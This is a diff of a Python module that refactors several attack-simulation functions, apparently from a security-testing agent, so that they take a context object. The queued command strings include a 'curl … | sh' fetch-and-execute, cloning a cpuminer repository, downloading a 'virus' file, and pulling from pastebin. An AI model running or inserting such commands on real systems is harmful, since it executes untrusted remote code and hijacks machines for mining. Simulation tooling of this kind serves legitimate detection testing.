@@ -1,43 +1,39 @@
 #!/usr/bin/python3
-import os
-
-from AaSystem.EventQueue.CommandQueue import EnqueueCommandsNext
-from AaSystem.LogAndPrint.Log import PrintAndLog, PrintRedAndLog
-from Agent.BashCommands.BashCommandExecutor import RunSubProcess
+from AaSystem.LogAndPrint.Log import PrintAndLog
 
 
-def DownloadFileThenRun(request):
+def DownloadFileThenRun(request, context):
     if "-help" in request:
         Help_DownloadFileThenRun()
         return
 
-    EnqueueCommandsNext(["custombash curl google.com | sh"])
+    context.EnqueueCommandsNext(["custombash curl google.com | sh"])
 
 
-def CryptoMiner(request):
+def CryptoMiner(request, context):
     if "-help" in request:
         Help_CryptoMiner()
         return
 
-    EnqueueCommandsNext(["gitclone https://github.com/cpuminer"])
+    context.EnqueueCommandsNext(["gitclone https://github.com/cpuminer"])
 
 
-def DownloadVirusFile(request):
+def DownloadVirusFile(request, context):
     if "-help" in request:
         Help_DownloadVirusFile()
         return
 
-    EnqueueCommandsNext(["createfiles -d ~/AriotsTemp/virus",
+    context.EnqueueCommandsNext(["createfiles -d ~/AriotsTemp/virus",
                          "downloadfile ~/AriotsTemp/virus/virus.txt "
                          "https://raw.githubusercontent.com/YuvalFeldman/AttackAgentGetFile/master/virus.txt"])
 
 
-def PossibleMalware(request):
+def PossibleMalware(request, context):
     if "-help" in request:
         Help_PossibleMalware(request)
         return
 
-    EnqueueCommandsNext(["retrievefile pastebin.com"])
+    context.EnqueueCommandsNext(["retrievefile pastebin.com"])
 
 
 def Help_DownloadFileThenRun():
